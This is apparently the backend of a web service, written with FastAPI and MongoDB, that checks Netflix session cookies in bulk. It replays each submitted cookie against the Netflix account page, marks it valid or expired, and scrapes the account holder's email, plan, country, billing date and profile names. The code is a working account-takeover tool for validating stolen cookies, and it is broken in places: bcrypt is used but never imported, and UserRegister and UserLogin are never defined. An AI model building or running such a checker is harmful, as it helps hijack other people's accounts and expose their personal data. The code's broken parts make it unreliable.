from fastapi import FastAPI, APIRouter, HTTPException, UploadFile, File, Header, Depends
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta
import secrets
import jwt
import httpx
from bs4 import BeautifulSoup
import re
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_SECRET = os.environ['JWT_SECRET']
JWT_ALGORITHM = "HS256"

app = FastAPI()
api_router = APIRouter(prefix="/api")

# --- Pydantic Models ---
class KeyLogin(BaseModel):
    key: str

class KeyCreate(BaseModel):
    label: str
    max_devices: int = 1

class KeyUpdate(BaseModel):
    label: Optional[str] = None
    max_devices: Optional[int] = None

class CookieCheckRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"

# --- Auth Helpers ---
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

def create_token(user_id: str) -> str:
    return jwt.encode(
        {"user_id": user_id, "exp": datetime.now(timezone.utc) + timedelta(days=7)},
        JWT_SECRET, algorithm=JWT_ALGORITHM
    )

async def get_current_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Not authenticated")
    token = authorization.split(" ")[1]
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        user = await db.users.find_one({"id": payload["user_id"]}, {"_id": 0, "password_hash": 0})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

# --- Cookie Parsing ---
def parse_netscape_cookies(text):
    cookies = {}
    for line in text.strip().split('\n'):
        line = line.strip()
        if line.startswith('#') or not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
        elif '=' in line:
            for pair in line.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, _, v = pair.partition('=')
                    cookies[k.strip()] = v.strip()
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {item['name']: item['value'] for item in data if 'name' in item and 'value' in item}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def parse_cookies_auto(text):
    text = text.strip()
    if text.startswith('[') or text.startswith('{'):
        result = parse_json_cookies(text)
        if result:
            return result
    return parse_netscape_cookies(text)

# --- Netflix Checker ---
async def check_netflix_cookie(cookie_text, format_type="auto"):
    if format_type == "json":
        cookies = parse_json_cookies(cookie_text)
    elif format_type == "netscape":
        cookies = parse_netscape_cookies(cookie_text)
    else:
        cookies = parse_cookies_auto(cookie_text)

    if not cookies:
        return {
            "status": "invalid",
            "email": None, "plan": None, "member_since": None,
            "country": None, "next_billing": None, "profiles": [],
            "full_cookie": cookie_text[:500],
            "error": "Could not parse cookies"
        }

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }

        async with httpx.AsyncClient(follow_redirects=True, timeout=15.0) as http:
            resp = await http.get(
                'https://www.netflix.com/YourAccount',
                cookies=cookies,
                headers=headers
            )
            html = resp.text

            if '/login' in str(resp.url) or 'login' in html[:1000].lower():
                return {
                    "status": "expired",
                    "email": None, "plan": None, "member_since": None,
                    "country": None, "next_billing": None, "profiles": [],
                    "full_cookie": cookie_text,
                    "error": "Cookie expired - redirected to login"
                }

            result = {
                "status": "valid",
                "email": None, "plan": None, "member_since": None,
                "country": None, "next_billing": None, "profiles": [],
                "full_cookie": cookie_text,
                "error": None
            }

            soup = BeautifulSoup(html, 'lxml')

            # Extract from reactContext script
            for script in soup.find_all('script'):
                text = script.string or ''
                if 'reactContext' in text:
                    match = re.search(r'reactContext\s*=\s*({.*?});', text, re.DOTALL)
                    if match:
                        try:
                            ctx = json.loads(match.group(1))
                            models = ctx.get('models', {})
                            user_info = models.get('userInfo', {}).get('data', {})
                            result['email'] = user_info.get('membershipEmail') or user_info.get('email')
                            result['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
                            result['member_since'] = user_info.get('memberSince')

                            plan_info = models.get('planInfo', {}).get('data', {})
                            result['plan'] = plan_info.get('planName')
                            result['next_billing'] = plan_info.get('nextBillingDate')

                            profiles_data = models.get('profiles', {}).get('data', [])
                            result['profiles'] = [p.get('firstName', p.get('profileName', 'Profile')) for p in profiles_data if isinstance(p, dict)]
                        except Exception:
                            pass

            # Fallback pattern matching
            if not result['email']:
                m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
                if m:
                    result['email'] = m.group(1)

            if not result['plan']:
                for p in ['Premium', 'Standard with ads', 'Standard', 'Basic', 'Mobile']:
                    if p.lower() in html.lower():
                        result['plan'] = p
                        break

            return result

    except httpx.TimeoutException:
        return {
            "status": "expired",
            "email": None, "plan": None, "member_since": None,
            "country": None, "next_billing": None, "profiles": [],
            "full_cookie": cookie_text,
            "error": "Connection timed out"
        }
    except Exception as e:
        logger.error(f"Cookie check error: {e}")
        return {
            "status": "invalid",
            "email": None, "plan": None, "member_since": None,
            "country": None, "next_billing": None, "profiles": [],
            "full_cookie": cookie_text,
            "error": str(e)
        }

# --- Auth Routes ---
@api_router.post("/auth/register")
async def register(data: UserRegister):
    existing = await db.users.find_one({"email": data.email}, {"_id": 0})
    if existing:
        raise HTTPException(status_code=400, detail="Email already registered")

    user_id = str(uuid.uuid4())
    await db.users.insert_one({
        "id": user_id,
        "username": data.username,
        "email": data.email,
        "password_hash": hash_password(data.password),
        "created_at": datetime.now(timezone.utc).isoformat()
    })
    token = create_token(user_id)
    return {"token": token, "user": {"id": user_id, "username": data.username, "email": data.email}}

@api_router.post("/auth/login")
async def login(data: UserLogin):
    user = await db.users.find_one({"email": data.email}, {"_id": 0})
    if not user or not verify_password(data.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid credentials")

    token = create_token(user["id"])
    return {"token": token, "user": {"id": user["id"], "username": user["username"], "email": user["email"]}}

@api_router.get("/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return {"id": user["id"], "username": user["username"], "email": user["email"]}

# --- Cookie Check Routes ---
@api_router.post("/check")
async def check_cookies(data: CookieCheckRequest, user: dict = Depends(get_current_user)):
    cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', data.cookies_text.strip())
    cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]

    if not cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found")

    results = []
    for block in cookie_blocks:
        result = await check_netflix_cookie(block, data.format_type)
        results.append(result)

    check_id = str(uuid.uuid4())
    valid_count = sum(1 for r in results if r["status"] == "valid")
    expired_count = sum(1 for r in results if r["status"] == "expired")
    invalid_count = sum(1 for r in results if r["status"] == "invalid")

    await db.checks.insert_one({
        "id": check_id,
        "user_id": user["id"],
        "results": results,
        "total": len(results),
        "valid_count": valid_count,
        "expired_count": expired_count,
        "invalid_count": invalid_count,
        "created_at": datetime.now(timezone.utc).isoformat()
    })

    return {
        "id": check_id,
        "results": results,
        "total": len(results),
        "valid_count": valid_count,
        "expired_count": expired_count,
        "invalid_count": invalid_count
    }

@api_router.post("/check/file")
async def check_cookies_file(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
    content = await file.read()
    text = content.decode('utf-8', errors='ignore')

    cookie_blocks = re.split(r'\n{3,}|={5,}|-{5,}', text.strip())
    cookie_blocks = [b.strip() for b in cookie_blocks if b.strip()]

    if not cookie_blocks:
        raise HTTPException(status_code=400, detail="No cookies found in file")

    results = []
    for block in cookie_blocks:
        result = await check_netflix_cookie(block, "auto")
        results.append(result)

    check_id = str(uuid.uuid4())
    valid_count = sum(1 for r in results if r["status"] == "valid")
    expired_count = sum(1 for r in results if r["status"] == "expired")
    invalid_count = sum(1 for r in results if r["status"] == "invalid")

    await db.checks.insert_one({
        "id": check_id,
        "user_id": user["id"],
        "results": results,
        "total": len(results),
        "valid_count": valid_count,
        "expired_count": expired_count,
        "invalid_count": invalid_count,
        "filename": file.filename,
        "created_at": datetime.now(timezone.utc).isoformat()
    })

    return {
        "id": check_id,
        "results": results,
        "total": len(results),
        "valid_count": valid_count,
        "expired_count": expired_count,
        "invalid_count": invalid_count
    }

# --- History Routes ---
@api_router.get("/history")
async def get_history(user: dict = Depends(get_current_user)):
    checks = await db.checks.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("created_at", -1).to_list(100)
    return checks

@api_router.delete("/history/{check_id}")
async def delete_check(check_id: str, user: dict = Depends(get_current_user)):
    result = await db.checks.delete_one({"id": check_id, "user_id": user["id"]})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Check not found")
    return {"message": "Deleted"}

# Include router
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
